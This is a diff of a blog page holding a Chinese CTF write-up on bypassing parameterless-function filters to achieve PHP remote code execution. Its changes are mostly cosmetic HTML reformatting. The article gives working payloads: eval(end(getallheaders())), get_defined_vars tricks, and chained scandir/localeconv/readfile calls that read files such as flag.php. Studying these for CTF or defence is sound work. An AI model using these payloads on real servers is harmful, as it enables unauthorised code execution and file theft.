@@ -101,90 +101,104 @@
        
   <p>1.我们先看一道题目</p>
 <a id="more"></a>
-
-<p>无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，<strong>不能带参数</strong><br><img src="https://img-blog.csdnimg.cn/20201024145652274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,‘c’)，<strong>不能带参数</strong><br>
+<img src="https://img-blog.csdnimg.cn/20201024145652274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <p>由 题目中的正则我们可以发现，我们无法写参数进去，只能用 a(b(c())) 这种方式进行rce，这题过滤的是中文 的  （）</p>
 <p>所以不要多想。（出题人的小技巧，哈哈）</p>
 <p>介绍无参数函数绕过所需要利用的函数</p>
-<h2 id="方法1：getenv"><a href="#方法1：getenv" class="headerlink" title="方法1：getenv()"></a>方法1：getenv()</h2><p>查阅php手册，有非常多的超全局变量</p>
+<h2 id="方法1：getenv"><a class="header-anchor" href="#方法1：getenv">¶</a>方法1：getenv()</h2>
+<p>查阅php手册，有非常多的超全局变量</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br><span class="line">$_REQUEST</span><br><span class="line">$_ENV</span><br></pre></td></tr></table></figure>
-
 <p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>
-<p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：</p>
+<p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>
+这里可以使用方法：</p>
 <p><img src="https://img-blog.csdnimg.cn/20201024145732174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="array-rand"><a href="#array-rand" class="headerlink" title="array_rand()"></a>array_rand()</h3><p>array_rand() 方法用于从一个数组中随机( 伪随机 )取出一个或者多个单元 ， 并返回随机条目的一个或者多个<strong>键</strong></p>
+<h3 id="array-rand"><a class="header-anchor" href="#array-rand">¶</a>array_rand()</h3>
+<p>array_rand() 方法用于从一个数组中随机( 伪随机 )取出一个或者多个单元 ， 并返回随机条目的一个或者多个<strong>键</strong></p>
 <p><a target="_blank" rel="noopener" href="http://www.guildhab.top/wp-content/uploads/2019/09/2019-09-21-131319_1016x529_scrot.png"><img src="https://img-blog.csdnimg.cn/img_convert/4618b3f7e06ebaf94631660816f05d97.png" alt="img"></a></p>
 <p>但这样只能获得数组的<strong>键</strong> ， 可以通过 array_flip() 函数获取数组的<strong>值</strong></p>
-<h3 id="array-flip"><a href="#array-flip" class="headerlink" title="array_flip()"></a>array_flip()</h3><p>该函数用于交换数组中的值和键 ， 返回一个 <strong>键</strong> 与 <strong>值</strong> 相互交换后的数组</p>
+<h3 id="array-flip"><a class="header-anchor" href="#array-flip">¶</a>array_flip()</h3>
+<p>该函数用于交换数组中的值和键 ， 返回一个 <strong>键</strong> 与 <strong>值</strong> 相互交换后的数组</p>
 <p><a target="_blank" rel="noopener" href="http://www.guildhab.top/wp-content/uploads/2019/09/2019-09-21-131607_1025x475_scrot-1.png"><img src="https://img-blog.csdnimg.cn/img_convert/2c27c6faa675b6b3652f32cacf394bb6.png" alt="img"></a></p>
-<p><code>getenv()</code> , <code>array_rand()</code> , <code>array_flip()</code> 加上全局变量<code>$_ENV</code> 这三个函数配套使用 ， 可以爆破出数组中需要的内容 . </p>
-<h2 id="方法2：getallheaders"><a href="#方法2：getallheaders" class="headerlink" title="方法2：getallheaders()"></a>方法2：getallheaders()</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><strong>getallheaders()</strong></h3><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://img-blog.csdnimg.cn/img_convert/56200f5c741008db01e13f150dd788ee.png" alt="img"></h2><h3 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/db6a1a5ad34e1771e12d5f897813acf8.png" alt="img"></p>
+<p><code>getenv()</code> , <code>array_rand()</code> , <code>array_flip()</code> 加上全局变量<code>$_ENV</code> 这三个函数配套使用 ， 可以爆破出数组中需要的内容 .</p>
+<h2 id="方法2：getallheaders"><a class="header-anchor" href="#方法2：getallheaders">¶</a>方法2：getallheaders()</h2>
+<h3 id="getallheaders"><a class="header-anchor" href="#getallheaders">¶</a><strong>getallheaders()</strong></h3>
+<h2 id="img"><a class="header-anchor" href="#img">¶</a><img src="https://img-blog.csdnimg.cn/img_convert/56200f5c741008db01e13f150dd788ee.png" alt="img"></h2>
+<h3 id="end"><a class="header-anchor" href="#end">¶</a>end()</h3>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/db6a1a5ad34e1771e12d5f897813acf8.png" alt="img"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(getallheaders()))        &#x2F;&#x2F;获取http请求头中最后一个参数的值，并执行</span><br></pre></td></tr></table></figure>
 <p>同样的有类似的函数</p>
 <p><img src="https://img-blog.csdnimg.cn/img_convert/11665495b9f5b15c697666e066f9e2df.png" alt="img"></p>
 <p>接下来开始演示  很奇怪的是 Host 在数组的最后一个位置，好像是倒着来的</p>
 <p><img src="https://img-blog.csdnimg.cn/20201024145818454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>所以 pos() 返回的应该是当前数组的第一个，也就是 phpinfo()   </p>
+<p>所以 pos() 返回的应该是当前数组的第一个，也就是 phpinfo()</p>
 <p><img src="https://img-blog.csdnimg.cn/20201024145836137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <p>这样我们就拿到了自定义的 HTTP Header 字段， 并且该字段可以被我们自由使用 ， 比如通过 <strong><code>eval()</code></strong> 函数执行 .</p>
-<h3 id="getallheders用法小结"><a href="#getallheders用法小结" class="headerlink" title="getallheders用法小结"></a>getallheders用法小结</h3><p>添加一个Header为<code>c: phpinfo();</code>,根据位置选择合适的payload：</p>
+<h3 id="getallheders用法小结"><a class="header-anchor" href="#getallheders用法小结">¶</a>getallheders用法小结</h3>
+<p>添加一个Header为<code>c: phpinfo();</code>,根据位置选择合适的payload：</p>
 <ol>
-<li><p>添加在Header在第一个：</p>
+<li>
+<p>添加在Header在第一个：</p>
 <p>payload: <code>code=eval(pos(getallheaders()));</code></p>
 <p>(pos()可以换为current(). 如果在第二个可以使用next())</p>
 </li>
-<li><p>添加在Header在最后一个：</p>
+<li>
+<p>添加在Header在最后一个：</p>
 <p>payload: <code>code=eval(end(getallheaders()));</code></p>
 </li>
-<li><p>不知道位置：</p>
+<li>
+<p>不知道位置：</p>
 <p>配合<code>array_rand()</code>, <code>array_flip()</code>构造payload进行爆破：</p>
 <p>payload: <code>eval(array_rand(array_flip(getallheaders())));</code></p>
 </li>
 </ol>
-<h2 id="方法3：localeconv"><a href="#方法3：localeconv" class="headerlink" title="方法3：localeconv()"></a>方法3：localeconv()</h2><h3 id="scandir-："><a href="#scandir-：" class="headerlink" title="scandir()："></a><code>scandir()</code>：</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/eab8a9b0ea71012825f1b88fbe203dac.png" alt="img"></p>
-<p><code>scandir(&#39;.&#39;)</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用<code>end()</code>和<code>readfile()</code>：</p>
-<p>但是还需要构造函数<code>scandir(&#39;.&#39;)</code>中的参数<code>.</code>，这里有一个<code>localeconv()</code>函数：</p>
+<h2 id="方法3：localeconv"><a class="header-anchor" href="#方法3：localeconv">¶</a>方法3：localeconv()</h2>
+<h3 id="scandir-："><a class="header-anchor" href="#scandir-：">¶</a><code>scandir()</code>：</h3>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/eab8a9b0ea71012825f1b88fbe203dac.png" alt="img"></p>
+<p><code>scandir('.')</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用<code>end()</code>和<code>readfile()</code>：</p>
+<p>但是还需要构造函数<code>scandir('.')</code>中的参数<code>.</code>，这里有一个<code>localeconv()</code>函数：</p>
 <p><img src="https://img-blog.csdnimg.cn/img_convert/3c84e0c3dc95ede553de16c2ea6e3bbe.png" alt="img"></p>
 <p>其中数组的第一个元素就是<code>.</code>， 所以用 pos 或者 current</p>
 <p>但是我们不知道 flag.php的位置所以我们还需要利用我们最开始讲的两个函数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="方法4：get-defined-vars"><a href="#方法4：get-defined-vars" class="headerlink" title="方法4：get_defined_vars()"></a>方法4：get_defined_vars()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars() 函数返回由所有已定义变量所组成的数组。</span><br></pre></td></tr></table></figure>
+<h2 id="方法4：get-defined-vars"><a class="header-anchor" href="#方法4：get-defined-vars">¶</a>方法4：get_defined_vars()</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars() 函数返回由所有已定义变量所组成的数组。</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用</p>
 </blockquote>
 <p>函数返回的内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;_GET&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_POST&quot;]&#x3D;&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;code&quot;]&#x3D;&gt;</span><br><span class="line">    string(29) &quot;var_dump(get_defined_vars());&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_COOKIE&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_FILES&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="利用-GET"><a href="#利用-GET" class="headerlink" title="利用$_GET"></a>利用<code>$_GET</code></h4><p>url：<a target="_blank" rel="noopener" href="http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo()">http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo()</a>;</p>
+<h4 id="利用-GET"><a class="header-anchor" href="#利用-GET">¶</a>利用<code>$_GET</code></h4>
+<p>url：<a target="_blank" rel="noopener" href="http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo();">http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo();</a></p>
 <p>post：<code>code=eval(end(current(get_defined_vars())));</code></p>
 <p><img src="https://img-blog.csdnimg.cn/img_convert/8095d1ff1f7a751bc549862db51b3cd4.png" alt="img"></p>
-<h2 id="方法5：直接遍历目录"><a href="#方法5：直接遍历目录" class="headerlink" title="方法5：直接遍历目录"></a>方法5：直接遍历目录</h2><p>可以尝试直接读取本地文件 , 其中最大的问题就是如何切换目录来遍历目录 .</p>
+<h2 id="方法5：直接遍历目录"><a class="header-anchor" href="#方法5：直接遍历目录">¶</a>方法5：直接遍历目录</h2>
+<p>可以尝试直接读取本地文件 , 其中最大的问题就是如何切换目录来遍历目录 .</p>
 <ol>
-<li><p><strong>getcwd() : 获取当前工作目录</strong></p>
+<li>
+<p><strong>getcwd() : 获取当前工作目录</strong></p>
 <p><img src="https://img-blog.csdnimg.cn/20201024150355315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
-</ol>
-<ol start="2">
-<li><p><strong>scandir() : 查看当前目录下的内容</strong></p>
+<li>
+<p><strong>scandir() : 查看当前目录下的内容</strong></p>
 <p><img src="https://img-blog.csdnimg.cn/20201024150126174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
-</ol>
-<ol start="3">
-<li><p><strong>dirname() : 跳转上级目录</strong></p>
+<li>
+<p><strong>dirname() : 跳转上级目录</strong></p>
 <p><img src="https://img-blog.csdnimg.cn/img_convert/a7d1c7254687e12c695a04b7a71562ed.png" alt="img"></p>
 </li>
-<li><p><strong>readfile() : 读取文件</strong></p>
+<li>
+<p><strong>readfile() : 读取文件</strong></p>
 <p>[<img src="https://img-blog.csdnimg.cn/img_convert/d48876cbd021d3a9f02808a6b3387c6e.png" alt="img"></p>
 </li>
 </ol>
 <p>当然 , 使用该方法读取文件的局限性很大 , 比如只能从当前目录递归遍历到根目录 , 而无法读取其他的目录的内容 . 基本上用处不太大~</p>
-<h2 id="常用playpoad"><a href="#常用playpoad" class="headerlink" title="常用playpoad"></a>常用playpoad</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="最后：所有利用到的函数总结"><a href="#最后：所有利用到的函数总结" class="headerlink" title="最后：所有利用到的函数总结"></a>最后：所有利用到的函数总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件 </span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line"></span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="常用playpoad"><a class="header-anchor" href="#常用playpoad">¶</a>常用playpoad</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))</span><br></pre></td></tr></table></figure>
+<h2 id="最后：所有利用到的函数总结"><a class="header-anchor" href="#最后：所有利用到的函数总结">¶</a>最后：所有利用到的函数总结</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件 </span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line"></span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>other:    <strong>array_flip可以替换为array_reverse</strong></p>
-<pre><code>            **readfile可以替换为show_source  和 highlight_flie**</code></pre>
+<pre><code>			**readfile可以替换为show_source  和 highlight_flie**</code></pre>
  
       <!-- reward -->
       
@@ -423,11 +437,7 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/friends">友链</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/2019/about">关于我</a>
+      <a class="nav-item-link" href="/about">关于我</a>
     </li>
     
   </ul>
@@ -633,6 +643,10 @@
 
 
 <!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
 
 <!-- ClickBoom1 -->
 
